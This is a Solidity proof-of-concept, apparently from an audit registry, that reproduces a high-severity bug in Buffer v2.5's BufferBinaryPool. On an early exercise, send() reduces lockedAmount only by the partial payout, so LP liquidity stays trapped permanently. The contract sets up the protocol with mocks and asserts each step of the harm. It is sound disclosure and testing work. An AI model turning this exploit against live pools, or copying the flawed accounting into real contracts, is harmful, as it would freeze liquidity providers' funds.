// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

// Real audited Buffer v2.5 source (unmodified) — the same files the registry PoC
// deploys. Compiled inside the registry Foundry project so these imports resolve
// exactly like the forge test. NO cheatcodes (no forge-std / vm.*): the in-browser
// EVM deploys `Exploit` and calls run().
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/core/BufferBinaryPool.sol";
import "../src/core/BufferBinaryOptions.sol";
import "../src/core/OptionsConfig.sol";
import "../src/interfaces/Interfaces.sol";

// --- opaque out-of-scope boundary doubles (NOT the finding) ---
contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}
contract BoosterDouble is IBooster {
    function getUserBoostData(address, address) external pure override returns (UserBoostTrades memory) { return UserBoostTrades(0, 0); }
    function updateUserBoost(address, address) external override {}
    function getBoostPercentage(address, address) external pure override returns (uint256) { return 0; }
}
contract OptionStorageDouble is IOptionStorage { function save(uint256, address, address) external override {} }
contract PoolOIStorageDouble is IPoolOIStorage {
    function updatePoolOI(bool, uint256) external override {}
    function totalPoolOI() external pure override returns (uint256) { return 0; }
}
contract ReferralDouble is IReferralStorage {
    function codeOwner(string memory) external pure override returns (address) { return address(0); }
    function traderReferralCodes(address) external pure override returns (string memory) { return ""; }
    function getTraderReferralInfo(address) external pure override returns (string memory, address) { return ("", address(0)); }
    function setTraderReferralCode(address, string memory) external override {}
    function setReferrerTier(address, uint8) external override {}
    function referrerTierStep(uint8) external pure override returns (uint8) { return 0; }
    function referrerTierDiscount(uint8) external pure override returns (uint32) { return 0; }
    function referrerTier(address) external pure override returns (uint8) { return 0; }
}

/// Trivial pass-through of the REAL BufferBinaryPool. Adds/overrides NOTHING — the
/// vulnerable send() executed is byte-identical audited logic. It exists only so its
/// artifact is co-located with the synthetic, letting the Playground render the real
/// BufferBinaryPool source in the step-through debugger.
contract PoolView is BufferBinaryPool {
    constructor(ERC20 _tokenX, uint32 _lockupPeriod) BufferBinaryPool(_tokenX, _lockupPeriod) {}
}

/// AuditVault #55634 [H-02] — BufferBinaryPool.send() decrements `lockedAmount`
/// by the amount SENT rather than by the whole option size it unlocks. On an
/// early exercise the payout is only a partial `profit < lockedAmount`, so the
/// `lockedAmount - profit` remainder is counted as locked forever even though the
/// option is fully closed — permanently trapping that much LP liquidity.
contract Exploit {
    MockUSDC public usdc;
    BufferBinaryPool public pool;
    BufferBinaryOptions public options;
    OptionsConfig public config;

    uint256 public constant LP_LIQUIDITY = 1_000e6;
    address internal constant SF_SINK = address(0x5E77);

    bool public proven;
    uint256 public lockedForever;

    constructor() {
        usdc = new MockUSDC();
        pool = new PoolView(ERC20(address(usdc)), 0);
        config = new OptionsConfig(pool);
        options = new BufferBinaryOptions();

        options.initialize(
            ERC20(address(usdc)),
            ILiquidityPool(address(pool)),
            IOptionsConfig(address(config)),
            IReferralStorage(address(new ReferralDouble())),
            IBufferBinaryOptions.AssetCategory.Crypto,
            "ETH",
            "USD"
        );
        config.setIV(10_000);
        config.setSettlementFeeDisbursalContract(SF_SINK);
        config.setOptionStorageContract(address(new OptionStorageDouble()));
        config.setPoolOIStorageContract(address(new PoolOIStorageDouble()));
        config.setBoosterContract(address(new BoosterDouble()));

        pool.grantRole(pool.OPTION_ISSUER_ROLE(), address(options));
        options.grantRole(options.ROUTER_ROLE(), address(this));
        options.approvePoolToTransferTokenX();
    }

    function run() external payable {
        // This contract is the sole LP and the option trader.
        usdc.mint(address(this), LP_LIQUIDITY);
        usdc.approve(address(pool), type(uint256).max);
        pool.provide(LP_LIQUIDITY, 0);

        uint256 amount = 100e6;   // lockedAmount = 100 USDC
        uint256 totalFee = 60e6;  // premium = 50, settlementFee = 10
        uint256 queuedTime = 1_000;
        uint256 period = 3_600;
        usdc.mint(address(options), totalFee);
        IBufferBinaryOptions.OptionParams memory p = IBufferBinaryOptions.OptionParams({
            strike: 1_000e8,
            amount: amount,
            period: period,
            allowPartialFill: false,
            totalFee: totalFee,
            user: address(this),
            referralCode: "",
            baseSettlementFeePercentage: 0
        });
        uint256 optionId = options.createFromRouter(p, queuedTime);
        require(pool.lockedAmount() == amount, "pre: full amount locked");

        // EARLY exercise (closingTime before expiration) => genuine PARTIAL payout.
        uint256 before = usdc.balanceOf(address(this));
        options.unlock(optionId, 1_000e8, queuedTime + 1_800, true); // @> pool.send() runs here
        uint256 profit = usdc.balanceOf(address(this)) - before;
        require(profit > 0 && profit < amount, "must be a partial payout");

        // === HARM: the (amount - profit) remainder is stuck as "locked" forever ===
        lockedForever = pool.lockedAmount();
        require(lockedForever == amount - profit && lockedForever > 0, "no funds locked");

        // The pool physically holds these tokens but availableBalance() hides them.
        uint256 freeTokens = pool.totalTokenXBalance();
        uint256 available = pool.availableBalance();
        require(freeTokens - available == lockedForever, "availableBalance not short");

        // The sole LP (this contract) cannot withdraw its full rightful share.
        uint256 lpShare = pool.shareOf(address(this));
        require(lpShare > available, "LP share should exceed withdrawable");
        bool reverted;
        try pool.withdraw(lpShare) { reverted = false; } catch { reverted = true; }
        require(reverted, "full withdrawal unexpectedly succeeded");

        // The LP can only ever get `available`; `lockedForever` stays trapped.
        pool.withdraw(available);
        require(usdc.balanceOf(address(pool)) - pool.lockedPremium() == lockedForever, "trapped != lockedForever");

        proven = true;
        require(proven, "harm not reproduced");
    }
}
